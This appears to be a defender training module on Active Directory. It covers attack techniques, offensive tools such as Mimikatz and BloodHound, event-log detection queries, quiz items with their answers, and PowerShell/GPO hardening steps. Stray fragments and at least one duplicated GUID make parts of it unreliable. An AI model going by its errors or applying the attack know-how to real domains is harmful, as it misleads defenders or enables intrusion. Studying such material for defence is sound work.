Windows PowerShell: A powerful object-oriented, scripting language that is tightly integrated with the Windows OS. It is identified by MITRE ATT&CK sub-technique ID T1059.001.

﻿

CMD: Command-Line Interface (CLI) that is not as robust as Windows PowerShell, but is still widely used within Windows environments. Threats actors often gain primary access through a CMD shell, then access PowerShell or other utilities. It is identified by MITRE ATT&CK sub-technique ID T1059.003.

﻿

Visual Basic: Adversaries may abuse Visual Basic (VB) and its derivatives — including VBScript and Visual Basic for Applications (VBA)— for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies. Common abuses include embedding macros in Office documents, which are then executed with the VB Runtime Library. It is identified by MITRE ATT&CK sub-technique ID T1059.005.

﻿

Windows Management Instrumentation: Windows Management Instrumentation (WMI) is a Windows administration feature that provides a consistent environment for local and remote access to Windows system components. Locally, it uses the WMI service for local execution, and Server Message Block (SMB) and Remote Procedure Call Service (RPCS) for remote execution. It is identified by MITRE ATT&CK technique ID T1047.

﻿

Component Object Model: Component Object Model (COM) is an Interprocess Communication (IPC) component of the native Windows Application Programming Interface (API) that enables interaction between software objects or executable code that implements interfaces. Client objects can call methods of server objects, which are typically Dynamic-Link Libraries (DLLs) or executables. When used as an execution tactic, it is identified by MITRE ATT&CK sub-technique ID T1559.001. Existing COM objects can also be used to obtain persistence in an attack known as COM hijacking, which falls under MITRE ATT&CK sub-technique T1546.015.

﻿

Dynamic Data Exchange: Another IPC component, Dynamic Data Exchange (DDE) is a client-server protocol for single use and/or continuous communications between applications. Once a link between applications is established, they can exchange strings, notifications, and requests for command execution. While DDE has been superseded by COM, it can still be enabled in Windows 10 and be used in Microsoft Office 2016 via registry keys. As with VB macros, DDE commands can be inserted into Office documents. It is identified by MITRE ATT&CK sub-technique ID T1559.002.

﻿

Persistence
﻿
While not specific to AD, persistence in AD makes it very easy to set logon scripts for users, groups, and computers granted the adversary has sufficient privileges. Adversaries can leverage Group Policy Objects (GPO) to configure settings including, but not limited to, the following that would enable persistence within a domain:

Logon or startup scripts
Registry keys on machines within a domain
Malicious services
User accounts

Which techniques/sub-techniques are most suitable to accomplish execution within AD environments?
• WMI
• Windows PowerShell
• DDE

AD Tactics and Techniques | Discovery and Lateral Movement
Discovery
﻿

AD is a database of sorts. Since it stores all objects known to it within the database, attackers who have compromised an AD domain and have the appropriate permissions can use the data within AD to gain more information about the objects in the domain. For example, attackers can get lists of all users, groups, and computers within a domain, which can reveal critical information and where to find it. Some native tools available to perform discovery tasks in AD are:

﻿

Directory Service Query: Directory Service Query (DSQuery) is a CMD utility that queries the objects in AD by employing user-specified search criteria.

﻿

AD PowerShell Module: A suite of PowerShell cmdlets that allow a user to query AD objects with Windows PowerShell. Some cmdlets in this suite used to gather information about a directory are Get-AdUser, Get-ADDomain, Get-AdComputer, Get-AdGroup, Get-AdGroupMember, and Get-AdObject.

﻿

Net Commands: The net commands can be accessed through CMD and are primarily used to manage network resources. However, net commands can be used by adversaries to enumerate users, shares, computers, groups, localgroups, etc.

﻿

WMI: Previously cited as an execution mechanism, adversaries also use WMI to enumerate hosts. WMI Command-line (WMIC) provides a utility usable through CMD to do this. WMIC can be used to get processes, user accounts, groups, etc.

﻿

Lateral Movement
These services can be used to move laterally within AD environments. However, they are not limited to just AD environments and can be found on standalone workstations.

﻿

Remote Desktop Protocol: Remote Desktop Protocol (RDP) allows users to access a Windows desktop remotely. This is disabled by default on workstations, but due to its utility, it is frequently enabled on servers and workstations. Adversaries can impersonate a legitimate user given the correct credentials. It is identified by MITRE ATT&CK sub-technique ID T1021.001.

﻿

SMB: SMB is a network file-sharing protocol that allows applications to read and write files and request services from server programs in a computer network. Historically, many vulnerabilities have been found in SMB that proved devastating to computer networks globally. Conficker in 2008 and WannaCry in 2017 are worms that propagated using exploits against SMB that both resulted in millions of dollars in damages for the systems they infected. It is identified by MITRE ATT&CK sub-technique ID T1021.002.

﻿

Windows Remote Management: Windows Remote Management (WinRM) is Microsoft’s implementation of the Web Services-Management protocol, which allows hardware and OSs from different vendors to interoperate. WinRM can be used to obtain management data locally and remotely through WMI. While WinRM is part of the OS, a listener must be enabled to perform remote operations. It is identified by MITRE ATT&CK sub-technique ID T1021.006.

﻿

Distributed COM: Distributed COM (DCOM) extends COM functionality so that actions performed through COM can be done remotely by using Remote Procedure Call (RPC). By default, only administrators can activate and launch COM objects remotely. This lateral movement sub-technique corresponds to the MITRE ATT&CK ID T1021.003.

Which would most likely allow an adversary to move laterally within an AD environment?
• WinRM
• SMB
• DCOM

AD Tools
Other than the native Windows utilities, there are a few notable third-party tools that deserve mention for their efficacy in enumerating and compromising AD environments.

﻿

BloodHound
﻿
Bloodhound is a visualization tool that assists with finding paths to exploiting AD principles and other objects. It maps things out as nodes, which represent AD objects such as users, groups, or computers. Nodes are connected by links known as Edges. Edges are how nodes relate to one another. Some examples of edges are:

﻿

﻿

Table 16.3-1

﻿

Bloodhound Components

﻿

SharpHound is the official data collector for BloodHound. It is written in C# and uses native Windows API functions and Lightweight Directory Access Protocol (LDAP) namespace functions to collect data from DCs and domain-joined Windows systems. SharpHound is an executable file uploaded after compromising a host to collect AD data.

﻿

AzureHound, as per the Bloodhound documentation, uses the Az Azure PowerShell module and Azure AD PowerShell module for gathering data within Azure and Azure AD.

﻿

NOTE: Microsoft Azure, commonly referred to as Azure, is a cloud-computing service created by Microsoft for building, testing, deploying, and managing applications and services through Microsoft-managed datacenters.

﻿

Bloodhound.py, while not officially supported by the Bloodhound team, is a Python script that collects data from Linux, OSX, or Windows systems with Python installed. Domain credentials are required to run the script.

﻿

BloodHound Graphical User Interface (GUI)

﻿

This is where most analysis occurs. After obtaining a database of the target’s AD structure, the database is opened in the Bloodhound GUI where the user can begin analyzing paths.

﻿

Mimikatz
﻿
Mimikatz is an open-source tool written in C by Benjamin Delphy, which interfaces with Windows security-related processes to conduct attacks such as PtH, PtT, Golden Ticket attacks, etc. It is a popular tool used in many AD attacks. MITRE ATT&CK identifies Mimikatz under the tool ID S0002.

﻿

PowerSploit
﻿
PowerSploit is an open-source, offensive security framework comprised of PowerShell modules and scripts that perform a wide range of tasks related to penetration testing such as code execution, persistence, bypassing anti-virus, reconnaissance, and exfiltration. MITRE ATT&CK refers to PowerSploit as tool ID S0194.

﻿

PowerShell Empire
﻿
PowerShell Empire is a robust, post-exploitation framework that includes a PowerShell 2.0 Windows agent and a pure Python 2.6/2.7 Linux agent, which allows users to run several modules with capabilities including privilege escalation, data collection, and persistence on supported hosts. It supports Metasploit Framework (MSF) integration as well. MITRE ATT&CK has PowerShell Empire listed under the tool ID S0363. Supported modules of note are Mimikatz, PowerSploit, and Invoke-BypassUAC, which is a collection of UAC Bypass techniques. 

Effectively Detecting Compromises in AD
As per Microsoft’s recommendations, a successful audit policy has the following attributes for effectively detecting compromises:

High likelihood that occurrence indicates unauthorized activity
Low number of false positives
Occurrence should result in an investigative/forensics response
Two types of events should be monitored and generate alerts:

Those events in which even a single occurrence indicates unauthorized activity
An accumulation of events above an expected and accepted baseline
In the first case, these events should never — or rarely — occur, so a single event should be investigated. An example of this is if your organization has a policy that states domain administrators should never log on to another host that is not a DC, yet a logon event for a domain administrator occurs on an end-user workstation.

﻿

The second case is more complex to configure, and requires an understanding of typical user and system behavior within a network environment. An example of the second case is hitting a threshold for failed logons to detect password brute forcing attacks. 

﻿

Attached is a list of Microsoft’s recommendation for events that should be investigated for further context (see Appendix L — Events to Monitor). A Potential Criticality of High warrants investigation. Potential criticalities of Medium or Low should only be investigated if they occur unexpectedly or in numbers that significantly exceed the expected baseline in a measured period of time.

﻿

Table 16.3-2 shows events with a Potential Criticality of High from Microsoft’s documentation.


Depending on organizational policy, there may be other events that warrant an alert. Consult the mission partner’s security policy to effectively determine where alerts should occur.

﻿Audit policy should be configured in such a manner that generated alerts result in many false positives.
false

Generally Useful Windows Event Log IDs
The Windows Security event log is a good starting point for detecting Malicious Cyberspace Activity (MCA) on a host. Windows Security event logs are also commonly forwarded to a Security Information Event Manager (SIEM). Once MCA has been detected, these security event IDs may further illuminate what the adversary did while they were in the network.

﻿

Event ID 4624 — An account was successfully logged on: When an account successfully authenticates and a session is generated, this event is generated. Information in the event includes who logged on, what method they used to log on (e.g., over the network or locally), and their privilege level. These event logs are very useful for monitoring who was logged on before an incident occurred, which may provide a lead to finding other MCA.

﻿

Event ID 4625 — An account failed to log on: This event is generated if an account logon attempt failed when the account was already locked out. It also generates for a logon attempt after which the account was locked out. Adversaries may generate these logs when attempting to access different user accounts without the necessary credentials.

﻿

Event ID 4648 — A logon was attempted using explicit credentials: This event occurs when a process attempts a logon by explicitly stating that account’s credentials. Normal occurrence of this may occur during batch jobs, using the runas command, WinRM logins, etc. These events may raise more flags if a privileged account was associated with the credentials. If switching logins during a session, an event code 4648 is likely generated.

﻿

Event ID 4663 — An attempt was made to access an object: This event indicates that a specific operation was performed on an object. An object is defined as either a filesystem, filesystem object, kernel, registry object, or removable device. This event can illuminate what files or data the adversary was trying to access on the target.

﻿

Event ID 4688 — A new process has been created: Documents each program or process that a system executes, its parent process, the user that spawned the process, privilege level, etc. While these events may generate a lot of noise, they are very useful in determining what occurred during an attack.

﻿

Event ID 4672 — Special privileges assigned to new logon: Tracks whether any special privileges were associated with new logons. This is another noisy event since every logon of SYSTEM triggers this event. In accordance with monitoring privileged accounts, however, this event could provide valuable accountability and correlation data, e.g. which account initiated the new log on.

﻿

PowerShell Logging
﻿

PowerShell maintains its own event logs outside of Windows Security event logs. Event IDs from the PowerShell logs of note include:

﻿

Event ID 4103: Corresponds to Module Logging. Module logging records pipeline execution details as PowerShell executes including variable initialization and command invocations. Module logging records portions of scripts, some deobfuscated code, and some data formatted for output. This logging captures some details missed by other PowerShell logging sources, though it potentially may not capture the commands executed.

﻿

Event ID 4104: Corresponds to PowerShell script block logging, which is not enabled by default. Script block logging records blocks of code as they are executed by the PowerShell engine, and captures the full contents of code executed by an attacker including scripts and commands. It captures the output of deobfuscated commands unlike event ID 4103.

﻿

NOTE: Updated versions of Windows Management Framework (version 4.0 or 5.0 depending on your OS) may need to be installed to enable enhanced PowerShell logging.

﻿Attacks and Identification Strategies
After the CDA detects a breach, they need to determine the actions undertaken on the target and how they were accomplished. How did the adversary gain domain administrator privileges? How did they circumvent UAC? The following list provides attack detection for common attacks that occur within AD environments discussed in previous tasks. The presence of these events on their own is not indicative of an attack; the events need contextualization from earlier alerts to which a CDA can associate these events and determine an attack has occurred.

﻿

Kerberoast: This can be detected under event ID 4769 — A Kerberos service ticket was requested. If the TicketEncryptionType is 0x17 in the event, it means the ticket is encrypted with the Rivest Cipher (RC) 4 cipher, which is a weaker algorithm that an adversary can break more easily.

﻿

DCSync: Artifacts generated include events with the ID 4662 — An operation was performed on an object, and the following possible Globally Unique Identifiers (GUID) and their associated control access right:

1131f6ad-9c07-11d1-f79f-00c04fc2dcd2: Directory Service (DS) Replication Get Changes
1131f6ad-9c07-11d1-f79f-00c04fc2dcd2: DS Replication Get Changes All
9923a32a-3607-11d2-b9be-0000f87a36b2: DS Install Replica
89e95b76-444d-4c62-991a-0facbeda640c: DS Replication Get Changes in Filtered Set
A GUID is Microsoft’s implementation of a universally unique ID for distributed computing, which identifies COM object and class interfaces.

﻿

NOTE: Event ID 4662 may not be enabled by default as it is a noisy event, and may require a registry revision to begin generating events.

﻿

PtH: Recall that NTLM authentication needs to be used for a PtH attack to be successful. Logon attempts with NTLM authentication may be suspect. To detect PtH techniques, consult event ID 4624 — An account was successfully logged on, and 4648 — A logon was attempted using explicit credentials. On the source that initiates the login, there is an event ID 4624 with a logon type 9, which is a NewCredential logon type, and a logon process of SecLogo, as well as an event ID of 4648. On the target that the adversary is attempting to log on to, there is another event ID of 4624 with a logon type 3, which means it was an NTLM logon. On the DC, there is an event ID of 4768 — A Kerberos authentication ticket or TGT was requested, 4769 — A Kerberos service ticket was requested, and 4776 — The computer attempted to validate the credentials for an account.

﻿

PtT: Since this attack allows the attacker to masquerade as a user by stealing a ticket rather than requesting a ticket, it is difficult to detect such an attack as their activity would appear as the legitimate user’s activity. However, users are allowed to renew tickets for up to seven days, which an adversary would likely do to prolong their access within the network and generates an event ID 4770 — A Kerberos service ticket was renewed. The CDA needs to correlate these events with alerts and further analysis to determine that PtT occurred. Regardless, if a user account was compromised, the CDA can assume their ticket and their credentials were compromised.

﻿

Unconstrained/Constrained Delegation: Delegation, at its core, simply allows for ticket reuse. If an adversary was able to compromise a target with delegation privileges, then they would be able to extract the TGTs of users connecting to that computer. Attacks leveraging ticket reuse have the same identification strategy as PtT attacks.

﻿

Golden Ticket Attack: These attacks are also difficult to detect. An indication of a Golden Ticket Attack can be seen by checking the expiration date of a suspected forged TGT. The Microsoft default is 10 hours, but a forged TGT may have an expiration date much further in the future, as tools such as Mimikatz set longer expiration dates by default. In addition, some forged TGTs may be formatted differently from legitimate TGTs if the adversary did not make the effort to mimic the structure of an existing ticket. In the case of a more sophisticated adversary that attempts to blend in, the absence of logs in this case would be a giveaway if ticket forgery occurred. A user typically acquires a TGT from the DC’s Authentication Service (AS), which involves an AS Request from the client, and a AS Response from the server. This results in an event ID of 4768 — A Kerberos authentication ticket (TGT) was requested. The absence of this event ID points toward ticket forgery, but needs correlation with other logs to confirm that this attack occurred.

﻿

Silver Ticket Attack: Silver ticket forgery omits more authentication steps; no TGT is needed so the first two steps can be ignored. The next step of presenting a TGT to the Ticket Granting Service (TGS) for a service ticket and receiving one in this case is omitted as well. In short, no communication occurs with the DC when forging a service ticket. This means there would be an absence of event IDs 4768 and 4769 when they should exist, correlated with any event logs that exist on the server that received the forged ticket.

﻿

UAC Bypass: This can be detected through process tracing, which appears under event ID 4688. The following command finds binaries that automatically elevate from a user-level context to an administrative context:

﻿

Strings -sc:\windows\system32\*.exe | findstr /I autoelevate
﻿

Binaries used in the past include eventviewer.exe and sdclt.exe. Sdclt.exe is a process associated with Windows Backup and Restore functionality.

﻿

A summary of the event ID is broken down in Table 16.3-3 for reference.


Using other native features of Windows OSs also generates log entries. Much of the native features have their own event logs which usually provide more detail than the security logs. Once you have an idea of which applications they exploited, you can search these logs for further information for lateral movement. This list is not all inclusive.

SMB
RDP
WinRM
WMI

Identify AD Attacks | Kerberoasting
Kerberos utilizes symmetric key encryption to maintain confidentiality (i.e., the same key to encrypt and decrypt data). The key is oftentimes derived from the password hash, though this depends on the cipher-suite selected, which is determined by the Ticket Encryption Type. Both ticket encryption types of 0x12 and 0x17 use hashes to encrypt.

﻿

The cipher-suite associated with ticket encryption type 0x17 uses Rivest Cipher 4 (RC4) and Message Digest 5 (MD5). RC4 is a fast encryption algorithm that has existed since the 1990s, and has been associated with a few notable security vulnerabilities, particularly with the Wireless Fidelity (Wi-Fi) standard Wired Equivalent Privacy (WEP). The hashing algorithm used with this ticket encryption type is MD5, which has been deemed cryptographically insecure.

﻿

The cipher-suite associated with ticket encryption type 0x12 uses Advanced Encryption Standard 256 (AES256) and Secure Hashing Algorithm 1 (SHA1). AES256 is a more modern encryption algorithm that is harder to break; the 256 denotes that the key length is 256 bits. SHA1 is the hashing algorithm used, and is a stronger hashing function than Message Digest (MD) 5.

﻿

Tickets with the encryption types 0x17 are much easier to brute force, which allows an adversary to expand their access within the network. Kerberoasting typically involves tickets with 0x17 as they are the most susceptible to cracking. 

﻿

Some common service accounts that are likely to allow lateral movement as per ADsecurity.org are:

Advanced Group Policy Management (AGPM) Server: Often has full control rights to all GPOs
Microsoft Structured Query Language (SQL) Server (MSSQL)/MSSQLSvc: Administrator rights to SQL server(s), which often have interesting data
Forefront Identity Manager (FIM) Service: Often has administrator rights to multiple AD Forests
Security Token Service (STS): VMWare SSO service that could provide backdoor VMWare access. Adversaries also often only search for accounts with administrative privileges.
In addition, the user requesting the tickets made several other service ticket requests within a very short time frame (within seconds), which is not typical user activity. This activity would very likely be related to Kerberoasting.

﻿_________ is the account name of the person that requested access to the ________ service.
• Kelley.Blasco, WebService

Identifying AD Attacks | DCSync
The account conducting a Kerberoast attack is Kelley.Blasco, based on the requested service tickets, and gathering the ones with weak encryption types.

NOTE: The following steps continue using the previous instance of Security Onion.

1. Clear the toggled columns before proceeding to the next step by selecting the x next to the toggled columns.

The next query searches for DC replication.

2. Run the following query:

event.module:windows_eventlog and message:"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
﻿
Recall that the Message field searches the entire log entry collected from the Windows event log.

There is only one event that matches this criterion.

3. Toggle the following fields:

winlog.event_data.SubjectDomainName: The domain name of the replicated domain. If there are multiple domains in a forest, then this field denotes which domain was replicated; in a single domain environment such as this one, there is only one domain — CDA.
user.name: The username of the account that requested a DCSync.
﻿
Identifying AD Attacks | DCSync Explained
NOTE: The following steps continue from the previous task.

4. Expand out the Message field of the singular 4662 event ID by selecting > by the event, and then selecting > next to the Message field.

Unfortunately, the event is not very descriptive. While the log entry does not impart much information, DCSyncs — especially initiated by a user — is not common. DCs frequently synchronize to keep the data between them consistent, so it is normal to have a computer name listed as the account name. User accounts on the other hand, need to explicitly initiate DCSyncs, so this is very atypical activity for a user. Since these entries have a low rate of false positives, each occurrence should be investigated.

Identifying AD Attacks | Pass-The-Hash
NOTE: The following steps continue from the previous task.

﻿

5. Clear the winlog.event_data.SubjectDomainName and user.name column headers.

﻿

6. Run the following query to find occurrences of PtH attacks:

﻿

event.module:windows_eventlog and event.code:4624 and winlog.event_data.LogonType:9 and winlog.event_data.LogonProcessName:SecLogo
﻿

Recall that event ID 4624 denotes a logon event. The logon type 9 denotes that the user specified new credentials for other connections, but is maintaining the same credentials for the local session. The process that manages the logon in this case is SecLogo (typically it would be Kerberos in an AD environment). This query has a low false positives rate and effectively detects where an adversary passed the hash. Further correlation can be done once the session is found.

﻿

There is one log entry associated with a potential PtH attack.

7. Toggle the following fields:

user.name
winlog.computer_name
winlog.event_data.SubjectLogonID
winlog.event_data.TargetLogonID       who became jdoe
The LogonId denotes the logon session of the user. If the LogonId of the adversary is known, then it becomes very easy to discover their activities on the target. The subject LogonId denotes their current session, and the target session denotes the new session they started with different credentials. If there is a LogonId associated with an entry linked to a potential attack, pay close attention to it.

﻿

Currently, you can tell that the user Patricia.Hans on the computer cda-exec-3 has been used in a likely PtH attack to compromise the CDA\administrator account.

Identifying AD Attacks | Correlation
NOTE: The following steps continue from the previous task.

Now that the new LogonID is known, the actions the adversary took after masquerading as a different user can be found. The CDA can also discover what events led to the compromise in the first place by searching for the SubjectLogonID.

8. Deselect the fields set in Step 7.

9. Run the following query to find activity associated with the adversary’s new session. The new subject ID in this case is the TargetLogonId from the previous log entry. The query is case-sensitive, so ensure that the LogonID is lowercase.
﻿

winlog.event_data.SubjectLogonId:0x32e6b93
﻿

There are 19 log entries associated with the session.

10. Toggle the event.code field.

This presents the event codes associated with the session, including many codes that can provide information about a compromise, as discussed in previous tasks.

The earliest event occurs Jul 14, 2021 @ 19:44:33.772. It has an event ID of 4672, which indicates that it is a privileged local session.


12. Toggle the winlog.event_data.NewProcessName and winlog.event_data.CommandLine fields. These fields give more information about what processes were started for the event ID 4688. Recall that event ID 4688 is associated with process auditing.

Conhost.exe is a process that allows cmd to interface with explorer.exe. The other process started is powershell. PowerShell has its own logging utility; this is seen shortly. The next events — 4673 — indicate that a privileged service was called.


13. Expand the first event code with the ID 4648 and expand the Message field.


This is rather concerning. The user is now attempting to authenticate to an administrator account in the domain on a DC whereas before it was limited to a local account. The associated process name was powershell.exe. All the other 4648 entries are similar. While the commands executed in PowerShell are not visible here, PowerShell maintains its own logs.


14. Deselect the winlog.event_data.NewProcessName and winlog.event_data.CommandLine fields.


15. Run the following command to check the PowerShell logs on the local machine first. The adversary initially began on cda-exec-3, so there are some logs here.


event.code:4103 and winlog.user.name:patricia.hans and host.name:"cda-exec-3"



Recall that event ID 4103 logs the PowerShell cmdlet that was executed. The query searches for cmdlets executed by the user Patricia.Hans on the computer with the hostname cda-exec-3.

16. Toggle the winlog.event_data.Payload field. This contains the cmdlet and switches used in the command.


It appears there is a decent amount of noise, though most of it is to set environmental variables for the PowerShell session. Filtering for entries associating the PowerShell session with the DC may be more helpful. If the field is not known ahead of time, then use the Message field to search all the text within the event.


17. Append and (message:"cda-dc" or message:174.16.1.6) to the end of the previous query:


event.code:4103 and winlog.user.name:patricia.hans and host.name:"cda-exec-3.cda.corp" and (message:"cda-dc" or message:174.16.1.6)



Now there is one result, and it is apparent that the user employed WinRM — as evidenced by the Enter-PSSession cmdlet — to enter an interactive PowerShell session with the DC.

While the log does not reference the username that accessed the DC, the previous event code 4648 references using explicit credentials to log onto the DC. Therefore, it seems likely that Patricia.Hans is using CDA\Administrator’s credentials.


18. Run the following query to determine which PowerShell commands the attacker executed on the DC:


event.code:4103 and winlog.user.name:administrator and host.name:"cda-dc.cda.corp"

The query contains the cmdlets executed on the target. In other cases, it may contain entries that are unrelated to the attack as a user, event ID, and a hostname may not be specific enough to narrow down MCA.


24. Toggle the winlog.event_data.ContextInfo field (the winlog.event_data.Payload field should still be toggled on.)


The first entry’s ContextInfo appears as follows.

The Host Application is C:\windows\system32\wsmprovhost.exe, which is started on the server-side of a WinRM session.

4104 is powershell

Implementing Mitigations in AD
Microsoft provides many general recommendations for protecting AD against compromises. Some of their security principles include: 

﻿

Protect Privileged Accounts
﻿

From the common AD attacks chain, it becomes clear that privileged accounts pose a potential liability to network security. Once a privileged account becomes compromised, it becomes trivial to move across the domain. These accounts include:

Local administrators
Domain administrators
Enterprise administrators
Other built-in accounts that a CDA may want to safeguard include:

Account operators: Members can administer domain user and group accounts.
Schema administrators: A universal group in the forest root domain with only the domain's built-in Administrator account as a default member; similar to the Enterprise Administrator group. Membership in the Schema Administrator group can allow an attacker to compromise the AD schema.
KRBTGT: The KRBTGT account is the service account for the Kerberos Key Distribution Center (KDC) in the domain. This account has access to all account credentials stored in AD. This account is disabled by default and should never be enabled.
Print operators: Members of this group can administer domain printers.
Read-only Domain Controllers (RODC): Contains all read-only DCs.
Replicator: Supports legacy file replication in a domain.
Server operators: Group members can administer domain servers.
Backup operators: Members of this group can override security restrictions for the purpose of backing up or restoring files.
Use privileged accounts for only administration or their intended purpose. A policy can be implemented that requires administrators to have a user account and a separate administrator account, which is only used for activities that require administrative privileges. MITRE ATT&CK also has Privileged Account Management as a mitigation technique under the identifier M1026.

﻿

Implement Principle of Least Privilege
﻿

From the Microsoft Windows Security Resource Kit:

﻿

Always think of security in terms of granting the least amount of privileges required to carry out the task. If an application that has too many privileges should be compromised, the attacker might be able to expand the attack beyond what it would if the application had been under the least amount of privileges possible. For example, examine the consequences of a network administrator unwittingly opening an email attachment that launches a virus. If the administrator is logged on using the domain administrator account, the virus will have Administrator privileges on all computers in the domain and thus unrestricted access to nearly all data on the network. 

﻿

Attackers are likely to follow the path of least resistance — there is even a tool dedicated to finding it that was covered earlier this lesson — which involves abusing simple mechanisms such as privilege overreach. 

﻿

Consider Using a Secure Administrative Host
﻿

A Secure Administrative Host is a workstation or sever that has been configured for the purpose of creating a secure platform from which privileged accounts can perform administrative tasks. Secure Administrative Hosts are dedicated solely to administrative functionality, and do not have extraneous applications such as email clients, productivity software, or web browsers. In addition, multi-factor authentication is often used on these hosts via enabling smart cards.

﻿

Configure an Audit Policy
﻿

If an adversary is determined — with enough time and resources — they are likely to succeed; all it takes is one user clicking on a phishing email after all. Having a good audit policy in place allows the network defender to quickly identify which accounts and machines are compromised. Configuring an audit policy for privileged accounts is essential as these accounts have high potential to cause damage. MITRE ATT&CK also has auditing as a mitigative measure under the technique ID M1047.

﻿

Secure DCs
﻿

DCs provide physical storage for AD Directory Services (AD DS) databases. Securing DCs involves both technical and physical measures. This involves maintaining network segmentation, keeping the latest version of Windows, implementing RDP restrictions, blocking internet access, etc. In the case that these measures are not enough, the DC needs regular backups, as the only way to be sure that a compromise was remediated is to restore it to a last-known good state. MITRE ATT&CK lists AD configuration as a mitigative measure, under technique ID M1015.

﻿

There are also a few Security Technical Implementation Guides (STIG) for AD that provide recommendations for a baseline of security. Many of the recommendations overlap with Microsoft’s recommendations. The high severity findings for Administrative Sensitive machines are:

﻿Thwarting Common AD Attacks
While common sense says to just disable unneeded services, several attacks target essential functions of AD that cannot be disabled. Defending against these attacks is usually not as simple as disabling a service.

﻿

Kerberoast
﻿

Microsoft provides a feature known as Managed Service Accounts (MSA) to maintain service accounts. A Standalone Managed Service Account (sMSA) is a managed domain account that provides automatic password management, simplified SPN management, and the ability to delegate management to other administrators. Group Managed Service Accounts (gMSA) take this feature a step further by extending the functionality over multiple servers. When this feature is configured, the password for service accounts becomes significantly more difficult to brute force. In addition, the password is also automatically changed after a specified time interval, further reducing the incidence of password brute force attempts.

﻿

Pass-the-Hash
﻿

PtH attacks require local administrator privileges to execute. Disabling or locking down the local built-in administrator account on hosts within the domain help prevent adversaries from using the account. In addition, adversaries have a harder time extracting hashes from the local machine, since administrative privilege is needed to pull them out of memory. In addition, using different accounts on local administrator accounts makes it more difficult for an adversary to leverage the local built-in administrator account on each workstation.

﻿

Pass the Ticket
﻿

Unfortunately, PtT attacks are impossible to prevent as they are an integral part of AD functionality. If an adversary can compromise an account, they can compromise the TGT of a user. If this attack is discovered, then the ticket can be destroyed by using the klist purge command. Analysis would have to be performed to determine the extent of the access gained by the adversary, but at a minimum, the user account password should be reset.

﻿

DCSync and Unconstrained Delegation
﻿

For attacks such as DCSync and Unconstrained Delegation, limit the amount of privileges users have to only those absolutely required to perform their job role. Case in point, standard users should not have Replicating Directory Changes. If delegation is needed in an environment, whitelist the services that can be delegated. In addition, ensure that privileged accounts cannot delegate privileges to prevent attackers from stealing tickets with administrative privileges. The users that have Replication privileges can be found using the following command, where $DOMAIN is the domain’s Fully Qualified Domain Name (FQDN), and $GUID is one of the four GUIDs mentioned previously.

﻿

Get-ACL "AD:$DOMAIN" | Select-Object -Expandproperty access | Where-Object -property ObjectType -eq "$GUID"
﻿

Figure 16.3-40 is an example of the output of the command being run with the DS Replication Get Changes GUID of 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2.

Golden/Silver Ticket Attacks
﻿

If an adversary was able to compromise the KRBTGT password hash, then they have had complete access to the machines within the AD domain, which includes the DC. If the DC has been compromised, then the best course of action is to restore the DC to the last-known good state. To contain the impact of a Golden Ticket attack, the following actions need to be taken:

The KRBTGT account password should be reset
The administrator should force replication
The administrator needs to reset the password again
The password needs to be reset twice because AD stores the current and previous password hashes, and in turn, tickets are still valid after one password reset. Resetting the password twice in quick succession breaks synchronization between DCs, which is why replication needs to be forced between DCs before resetting the password again. Once these actions are performed, if the adversary uses the previous Golden Ticket to generate any TGTs, then an event ID 4769 is generated.

﻿

UAC Bypass
﻿

While there are mechanisms to circumvent UAC, the highest setting should still be configured which is not the default setting. As per MITRE ATT&CK, if the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. To monitor UAC Bypass, refer to process auditing logs.

﻿Implementing Mitigations in AD | Accounts and Permissions
﻿
There are more domain administrators than specified by the mission partner. Upon asking, the local network defenders stated that the Jackie.Ruiz user account belonged to a previous DoD civilian who moved on to find employment elsewhere and should have been deleted. The other user account — Lucia.Hammond — belongs to an employee who previously was a local network defender, but now works in a different department.

﻿

NOTE: The following steps continue from the previous task.

﻿

4. Delete the user account belonging to the former employee:

﻿

PS C:\windows\system32> Remove-ADUser -Identity Jackie.Ruiz -Confirm:$False

5. Remove the other user account from the Domain Admins group:

﻿

PS C:\windows\system32> Remove-AdGroupMember -Identity "Domain Admins" -Members Lucia.Hammond -Confirm:$False
﻿
6. Verify that the cmdlets successfully removed the users from the Domain Admins group:

﻿

PS C:\windows\system32> Get-AdGroupMember "Domain Admins"
﻿

Now there are only six users.


7. Check the delegation property for the Domain Administrators group:

﻿

PS C:\windows\system32> Get-AdGroupMember "Domain Admins" | Get-AdUser -Property AccountNotDelegated | Format-Table Name,AccountNotDelegated
﻿

Recall that Microsoft best practices and the STIGs for AD recommend disabling delegation for privileged accounts. Delegation is not explicitly prohibited as per the result of the command.

8. Disable delegation for all Domain Administrator accounts by running the following command:

﻿

PS C:\windows\system32> Get-AdGroupMember "Domain Admins" | Set-AdUser -AccountNotDelegated $true
﻿

9. Verify that the command was successful.

﻿

PS C:\windows\system32> Get-AdGroupMember "Domain Admins" | Get-AdUser -Property AccountNotDelegated | Format-Table Name,AccountNotDelegated
﻿
The next set of actions severely locks down the built-in Administrator account, which is a domain administrator, as well as a local administrator on the DC. Since this high-value account exists by default, adversaries know to target this user, which presents a liability to the mission partner.

﻿

10. Open Group Policy Management by selecting the shortcut on the desktop.

11. Right-click cda.corp in the left side menu and select Create a GPO in this domain and Link it here….

12. Enter ADDefense in the Name field and select OK.

13. Right-click the newly created GPO and select Edit.

14. Select Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > User Rights Assignment. Right-click Deny access to this computer from the network and select Properties.

﻿

This GPO prevents the user account Administrator from logging on to the DC over the network, such as with WinRM. This prevents the MITRE ATT&CK lateral movement technique T1021 Remote Services.

15. Select the checkbox next to Define these policy settings: and select Add User or Group….

16. Enter CDA\Administrator and select OK.


17. Select Add User or Group again. Enter ADMINISTRATOR and select OK.

﻿

CDA\ADMINISTRATOR restricts the built-in domain administrator, whereas ADMINISTRATOR restricts the local administrator on each host in the domain.

﻿

18. Select Apply > OK.

﻿

19. Follow the same steps for Deny log on as a batch job, Deny log on as a service, and Deny log on through Remote Desktop Services.

These GPO settings do the following:

Deny log on as a batch job: This policy setting determines which accounts cannot log on by using a batch-queue tool such as the Task Scheduler service. Adversaries often use scheduled tasks as a means of execution and persistence or privilege escalation, as identified by MITRE ATT&CK technique T1053.
Deny log on as a service: This policy setting determines which users are prevented from logging on to the service applications on a device. Adversaries often use system services to execute commands or programs, as identified by MITRE ATT&CK technique T1569.
